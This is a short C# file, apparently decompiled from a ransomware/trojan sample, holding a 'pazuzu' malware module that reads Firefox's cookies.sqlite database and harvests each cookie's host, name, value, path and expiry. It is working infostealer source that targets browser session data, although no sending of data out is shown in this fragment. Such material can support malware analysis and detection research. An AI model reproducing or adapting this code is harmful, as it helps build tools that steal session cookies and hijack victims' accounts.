// Decompiled with JetBrains decompiler
// Type: pazuzu.FireFox.Cookies
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using pazuzu.Required;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.FireFox
{
  internal sealed class Cookies
  {
    public static List<Common.Cookie> Get(string BrowserDir)
    {
      List<Common.Cookie> cookieList = new List<Common.Cookie>();
      string profile = Profile.GetProfile(BrowserDir);
      if (profile == null)
        return cookieList;
      SQLiteHandler sqLiteHandler = SQLiteHandler.ReadTable(Path.Combine(profile, "cookies.sqlite"), "moz_cookies");
      if (sqLiteHandler == null)
        return cookieList;
      for (int row_num = 0; row_num < sqLiteHandler.GetRowCount(); ++row_num)
        cookieList.Add(new Common.Cookie()
        {
          sHostKey = sqLiteHandler.GetValue(row_num, 4),
          sName = sqLiteHandler.GetValue(row_num, 2),
          sValue = sqLiteHandler.GetValue(row_num, 3),
          sPath = sqLiteHandler.GetValue(row_num, 5),
          sExpiresUtc = sqLiteHandler.GetValue(row_num, 6)
        });
      return cookieList;
    }
  }
}
